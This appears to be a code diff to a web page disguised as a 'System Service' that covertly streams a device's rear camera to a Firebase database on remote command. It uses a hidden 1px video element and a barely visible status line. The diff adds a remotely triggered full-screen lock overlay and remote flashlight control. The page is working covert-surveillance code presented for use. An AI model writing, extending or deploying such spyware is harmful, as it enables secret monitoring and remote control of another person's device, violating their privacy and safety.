@@ -4,18 +4,26 @@
     <title>System Service</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        body { background: black; color: white; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        #bloqueo { display: none; text-align: center; background: black; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; justify-content: center; align-items: center; flex-direction: column; }
+        .warning { color: red; font-size: 30px; font-weight: bold; }
+    </style>
 </head>
-<body style="background:black; color:white; font-family:sans-serif; text-align:center;">
-    <div id="status" style="margin-top:20px;">
+<body>
+    <div id="bloqueo">
+        <span class="warning">⚠️ ACCESO RESTRINGIDO</span>
+    </div>
+
+    <div id="status">
         <div style="width:10px; height:10px; background:#0f0; border-radius:50%; margin:auto;"></div>
-        <p style="font-size:10px; color:#333;">SISTEMA ACTIVO</p>
+        <p style="font-size:10px; color:#111;">SISTEMA NATIVO ACTIVO</p>
     </div>
 
     <video id="v" autoplay playsinline style="width:1px; height:1px; opacity:0;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        // PEGA AQUÍ TU CONFIGURACIÓN DE FIREBASE
         const firebaseConfig = {
             databaseURL: "TU_URL_DE_FIREBASE"
         };
@@ -25,38 +33,47 @@
         const video = document.getElementById('v');
         const canvas = document.getElementById('c');
         const context = canvas.getContext('2d');
+        const pantallaBloqueo = document.getElementById('bloqueo');
         let transmitiendo = false;
 
-        // Función para enviar video en tiempo real
+        // --- LÓGICA DE VIDEO ---
         function flujoVideo() {
             if (!transmitiendo) return;
-            
-            canvas.width = 400; // Resolución optimizada para velocidad
+            canvas.width = 400;
             canvas.height = 300;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Enviamos el frame comprimido
             const data = canvas.toDataURL('image/jpeg', 0.2);
             db.ref('stream').set(data);
-            
             requestAnimationFrame(flujoVideo);
         }
 
-        // Escuchar órdenes del padre
         db.ref('comando_video').on('value', (snap) => {
             if (snap.val() === "ON") {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
-                .then(s => {
-                    video.srcObject = s;
-                    transmitiendo = true;
-                    flujoVideo();
-                });
+                .then(s => { video.srcObject = s; transmitiendo = true; flujoVideo(); });
             } else {
                 transmitiendo = false;
-                if (video.srcObject) {
-                    video.srcObject.getTracks().forEach(t => t.stop());
-                }
+                if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
                 db.ref('stream').set(null);
+            }
+        });
+
+        // --- LÓGICA DE BLOQUEO (Esta es la que te faltaba) ---
+        db.ref('bloqueo').on('value', (snap) => {
+            if (snap.val() === "ACTIVAR") {
+                pantallaBloqueo.style.display = "flex";
+            } else {
+                pantallaBloqueo.style.display = "none";
+            }
+        });
+
+        // --- LÓGICA DE LINTERNA ---
+        db.ref('linterna').on('value', (snap) => {
+            const track = video.srcObject ? video.srcObject.getVideoTracks()[0] : null;
+            if (track) {
+                track.applyConstraints({
+                    advanced: [{ torch: (snap.val() === "ON") }]
+                });
             }
         });
     </script>
